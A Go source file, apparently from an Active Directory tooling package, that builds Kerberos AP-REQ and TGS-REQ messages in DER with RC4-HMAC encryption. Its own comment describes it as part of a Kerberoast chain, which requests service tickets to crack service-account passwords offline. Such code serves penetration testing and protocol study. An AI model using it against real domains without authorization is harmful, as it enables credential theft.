package adgo

import (
	"errors"
	"fmt"
	"time"
)

// TGS-REQ construction — the second half of the Kerberoast chain.
//
// TGS-REQ ::= [APPLICATION 12] KDC-REQ
//
// The request wraps the TGT from the AS-REP in padata (PA-TGS-REQ,
// padata-type 1) and asks for a service ticket for a specific SPN.
//
// The padata value is an AP-REQ:
//
//   AP-REQ ::= [APPLICATION 14] SEQUENCE {
//       pvno            [0] INTEGER (5),
//       msg-type        [1] INTEGER (14),
//       ap-options      [2] APOptions,
//       ticket          [3] Ticket,               -- the TGT
//       authenticator   [4] EncryptedData         -- encrypted with the session key
//   }
//
// The authenticator is a fresh timestamp encrypted with the TGT's session
// key. That's the bit that proves we hold the TGT — the DC decrypts it
// with the session key it delivered in the AS-REP.
//
//   Authenticator ::= [APPLICATION 2] SEQUENCE {
//       authenticator-vno  [0] INTEGER (5),
//       crealm             [1] Realm,
//       cname              [2] PrincipalName,
//       cusec              [3] Microseconds,
//       ctime              [4] KerberosTime,
//       subkey             [5] EncryptionKey OPTIONAL,
//       seq-number         [6] UInt32 OPTIONAL
//   }

// PADataTGSReq is the padata type for PA-TGS-REQ.
const PADataTGSReq = 1

// APReqOptions controls an AP-REQ construction.
type APReqOptions struct {
	Realm        string   // client realm
	ClientName   []string // client principal components
	SessionKey   []byte   // the TGT session key (from DecryptASRepPart)
	SessionEType int32    // session key etype (RC4/AES)
	Ticket       []byte   // the DER-encoded Ticket from the AS-REP
}

// APReqOptions has everything we need to build the AP-REQ that goes
// inside PA-TGS-REQ padata.
//
// BuildAPReq constructs the DER-encoded AP-REQ.
func BuildAPReq(opts APReqOptions) ([]byte, error) {
	if opts.Realm == "" {
		return nil, errors.New("adgo: realm required")
	}
	if len(opts.ClientName) == 0 {
		return nil, errors.New("adgo: client name required")
	}
	if len(opts.SessionKey) == 0 {
		return nil, errors.New("adgo: session key required")
	}
	if len(opts.Ticket) == 0 {
		return nil, errors.New("adgo: ticket required")
	}

	// build the Authenticator (before encryption)
	authenticator := buildAuthenticator(opts)

	// encrypt it with the session key. RC4-HMAC only for now.
	if opts.SessionEType != ETypeRC4_HMAC {
		return nil, fmt.Errorf("adgo: AP-REQ for session etype %d not implemented (RC4 only)", opts.SessionEType)
	}
	// key usage for PA-TGS-REQ authenticator is 7 (RFC 4120 §7.5.1)
	encAuth, err := encryptRC4WithUsage(opts.SessionKey, authenticator, 7)
	if err != nil {
		return nil, err
	}

	// wrap the encrypted authenticator as EncryptedData
	//   EncryptedData ::= SEQUENCE { [0] etype, [1] kvno OPTIONAL, [2] cipher }
	var edBody []byte
	edBody = append(edBody, DERContextTag(0, false, DERInteger(int64(opts.SessionEType)))...)
	edBody = append(edBody, DERContextTag(2, false, DEROctetString(encAuth))...)
	encData := DERSequence(edBody)

	// AP-REQ body
	var apBody []byte
	apBody = append(apBody, DERContextTag(0, false, DERInteger(5))...)  // pvno
	apBody = append(apBody, DERContextTag(1, false, DERInteger(14))...) // msg-type AP-REQ
	apBody = append(apBody, DERContextTag(2, false, DERInteger(0))...)  // ap-options (none)
	apBody = append(apBody, DERContextTag(3, true, opts.Ticket)...)     // ticket (raw DER)
	apBody = append(apBody, DERContextTag(4, true, encData)...)         // authenticator

	apReq := DERApplicationTag(14, true, DERSequence(apBody))
	return apReq, nil
}

// buildAuthenticator constructs the DER-encoded Authenticator structure
// (before encryption).
func buildAuthenticator(opts APReqOptions) []byte {
	now := time.Now().UTC()
	timestamp := now.Format("20060102150405") + "Z"
	microseconds := now.Nanosecond() / 1000

	// cusec [3] Microseconds
	cusec := DERContextTag(3, false, DERInteger(int64(microseconds)))

	// ctime [4] KerberosTime
	ctime := DERContextTag(4, false, DERGeneralizedTime(timestamp))

	// crealm [1] Realm (GeneralString)
	crealm := DERContextTag(1, false, DERGeneralString(opts.Realm))

	// cname [2] PrincipalName
	cname := KerbPrincipal(1, opts.ClientName)
	cnameTagged := DERContextTag(2, true, cname)

	var authBody []byte
	authBody = append(authBody, DERContextTag(0, false, DERInteger(5))...) // authenticator-vno
	authBody = append(authBody, crealm...)
	authBody = append(authBody, cnameTagged...)
	authBody = append(authBody, cusec...)
	authBody = append(authBody, ctime...)

	return DERApplicationTag(2, true, DERSequence(authBody))
}

// TGSReqOptions controls a TGS-REQ construction.
type TGSReqOptions struct {
	Realm      string   // target realm (usually same as client)
	ClientName []string // client principal components
	Service    string   // SPN service class (e.g. "MSSQLSvc")
	Host       string   // SPN host (e.g. "db.corp.local")
	SPNFull    string   // if set, used directly instead of Service/Host
	ETypes     []int32
	Nonce      uint32
	KDOptions  uint32
}

// BuildTGSReq wraps the TGT and constructs the TGS-REQ.
func BuildTGSReq(tgsOpts TGSReqOptions, apReq []byte) ([]byte, error) {
	if tgsOpts.Realm == "" {
		return nil, errors.New("adgo: realm required")
	}
	if len(tgsOpts.ClientName) == 0 {
		return nil, errors.New("adgo: client name required")
	}
	if len(tgsOpts.ETypes) == 0 {
		tgsOpts.ETypes = []int32{ETypeRC4_HMAC, ETypeAES256, ETypeAES128}
	}
	if tgsOpts.KDOptions == 0 {
		tgsOpts.KDOptions = KDCOptionForwardable | KDCOptionRenewable
	}
	if tgsOpts.Nonce == 0 {
		tgsOpts.Nonce = uint32(time.Now().UnixNano() & 0x7FFFFFFF)
	}

	// sname components
	var snameComponents []string
	if tgsOpts.SPNFull != "" {
		// SPN format: Service/host — split on '/'
		snameComponents = splitSPN(tgsOpts.SPNFull)
	} else if tgsOpts.Service != "" && tgsOpts.Host != "" {
		snameComponents = []string{tgsOpts.Service, tgsOpts.Host}
	} else {
		return nil, errors.New("adgo: SPN (Service+Host or SPNFull) required")
	}

	// --- KDC-REQ-BODY ---
	var body []byte
	body = append(body, DERContextTag(0, false, DERInteger(int64(tgsOpts.KDOptions)))...) // kdc-options
	body = append(body, DERContextTag(1, true, KerbPrincipal(1, tgsOpts.ClientName))...)  // cname
	body = append(body, DERContextTag(2, false, DERGeneralString(tgsOpts.Realm))...)      // realm
	body = append(body, DERContextTag(3, true, KerbPrincipal(2, snameComponents))...)     // sname

	till := time.Now().Add(24*time.Hour).UTC().Format("20060102150405") + "Z"
	body = append(body, KerbTime(5, till)...)

	body = append(body, DERContextTag(7, false, DERInteger(int64(tgsOpts.Nonce)))...)

	var etypeSeq []byte
	for _, et := range tgsOpts.ETypes {
		etypeSeq = append(etypeSeq, DERInteger(int64(et))...)
	}
	body = append(body, DERContextTag(8, true, etypeSeq)...)

	// --- PA-TGS-REQ padata ---
	// PA-DATA ::= SEQUENCE { [1] padata-type=1, [2] padata-value=AP-REQ }
	var pdBody []byte
	pdBody = append(pdBody, DERContextTag(1, false, DERInteger(PADataTGSReq))...)
	pdBody = append(pdBody, DERContextTag(2, false, DEROctetString(apReq))...)
	paData := DERSequence(pdBody)

	// padata [3] in KDC-REQ is SEQUENCE OF PA-DATA
	padataSeq := DERSequence(paData)

	// --- KDC-REQ header ---
	var req []byte
	req = append(req, DERContextTag(1, false, DERInteger(5))...)  // pvno
	req = append(req, DERContextTag(2, false, DERInteger(12))...) // msg-type TGS-REQ
	req = append(req, DERContextTag(3, true, padataSeq)...)       // padata
	req = append(req, DERContextTag(4, true, body)...)            // req-body

	// wrap in SEQUENCE + [APPLICATION 12]
	return DERApplicationTag(12, true, DERSequence(req)), nil
}

// splitSPN splits "Service/host" into ["Service", "host"].
func splitSPN(spn string) []string {
	for i := 0; i < len(spn); i++ {
		if spn[i] == '/' {
			return []string{spn[:i], spn[i+1:]}
		}
	}
	return []string{spn}
}

// encryptRC4WithUsage is exposed here for the AP-REQ authenticator
// encryption (key usage 7). Duplicates the internal encrypt helper in
// kerberos_padata.go but with an arbitrary usage.
func encryptRC4WithUsage(key, plaintext []byte, usage uint32) ([]byte, error) {
	if len(key) != 16 {
		return nil, errors.New("adgo: RC4 key must be 16 bytes")
	}
	var usageBytes [4]byte
	usageBytes[0] = byte(usage)
	usageBytes[1] = byte(usage >> 8)
	usageBytes[2] = byte(usage >> 16)
	usageBytes[3] = byte(usage >> 24)

	k1 := HMACMD5(key, usageBytes[:])
	checksum := HMACMD5(k1, plaintext)
	k3 := HMACMD5(k1, checksum)
	cipher := RC4Encrypt(k3, plaintext)
	out := append([]byte{}, checksum...)
	out = append(out, cipher...)
	return out, nil
}
